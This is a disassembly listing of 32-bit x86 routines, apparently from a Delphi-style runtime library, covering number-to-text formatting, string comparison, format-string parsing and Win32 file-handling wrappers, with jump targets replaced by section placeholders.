mov al [ ebp - 0x5 ]
mov [ edi ] al
inc edi
mov esi ebx
mov dl [ ebp - 0x5 ]
mov eax esi
call sub_40cb64
mov ebx eax
test ebx ebx
jne r-xdata
mov eax esi
call sub_408bbc
mov ebx eax
mov ecx ebx
sub ecx esi
mov edx edi
mov eax esi
call sub_4028e8
sub ebx esi
add edi ebx
mov al [ ebp - 0x5 ]
mov [ edi ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408454
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
sub_40845c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4043d8
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4043d8
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_4084c0
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_4084d6
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_4084d6
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4084d6
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40850c
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_4084c0
mov edx esi
pop eax
call sub_404208
add esp 0x10
pop esi
retn
sub_40852c
or cl cl
jne sub_408560
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_408560
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_408560
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_408560
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4085f8
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_40852c
mov edx esi
pop eax
call sub_404208
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408620
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_4084c0
mov edx esi
pop eax
call sub_404208
add esp 0x20
pop esi
retn
xor edx edx
sub_408648
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402d20
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407fbc
sub_40869c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402d20
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4086bc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_405008
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4086dc
mov eax [ rw-data ]
call sub_405238
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_405238
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4053f4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40416c
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4053f4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40416c
sub_40876c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_408248
test al al
je r-xdata
sub_4087a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409a0c
mov edx eax
test dl dl
je r-xdata
call sub_4086dc
push ebp
mov eax [ rw-data ]
call sub_405240
mov edx eax
mov eax [ rw-data ]
call sub_40876c
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_405240
mov edx eax
mov eax [ rw-data ]
call sub_40876c
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408844
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40416c
call sub_4086dc
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40416c
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40416c
jmp r-xdata
pop esi
pop ebx
retn
sub_408890
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4045d8
push eax
call CreateFileA
sub_4088e8
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4045d8
push eax
call CreateFileA
pop ebx
retn
sub_408914
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408940
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40896c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4089ac
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_4045d8
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_408a3c
push ebx
push esi
mov esi eax
mov eax esi
call sub_4043d8
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c740
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408a6c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4043d8
mov edi eax
mov eax ebx
call sub_4045d8
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408d28
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c740
cmp al 0x2
jne r-xdata
dec edi
sub_408abc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408a6c
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404638
pop edi
pop esi
pop ebx
retn
sub_408af4
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4045d8
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404208
add esp 0x108
pop esi
pop ebx
retn
sub_408b30
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404fe4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404fe4
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408be0
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408c08
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408c3c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4043d8
push eax
mov eax ebx
call sub_4045d8
mov edx eax
mov eax esi
pop ecx
call sub_408c08
pop esi
pop ebx
retn
sub_408c60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4045d8
mov edx eax
mov ecx edi
mov eax ebx
call sub_408c08
pop edi
pop esi
pop ebx
retn
sub_408c80
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408ca4
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408ce4
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408d3c
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408dc4
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408ba4
mov esi eax
inc esi
mov eax esi
call sub_408da4
mov ecx esi
mov edx ebx
call sub_408bd0
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408e00
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c764
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408bd0
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407fbc
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408e88
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_4091df
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408f6a
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408fb2
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408f6a
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408e7c
pop edx
or edx edx
je r-xdata
sub_408f6a
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_4091df
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408fb2
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_4091df
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408e00
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408fd9 ]
mov ebx ecx
sub cl 0x44
je sub_40852c
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404340
jmp r-xdata
mov esi sub_4043a0
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_40852c
sub cl 0x44
je sub_4084c0
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_4084c0
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_40852c
mov ecx 0x10
cmp bl 0x58
je sub_4084c0
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408e58
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_409398
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4084c0
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_409200
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408ba4
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408e88
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_409240
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408ba4
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408e88
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_409294
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4043d8
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408e88
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404208
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_404118
mov eax esi
mov edx ebx
call sub_404764
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408e88
mov edx esi
xchg edx eax
call sub_404764
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_409354
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_409398
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_40966c
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_409497
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4094a1
call sub_409497
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409354
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_4094fd
call sub_409497
call sub_40948e
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_40948e
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409354
retn
xor ecx ecx
sub_409539
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_40948e
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_40948e
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
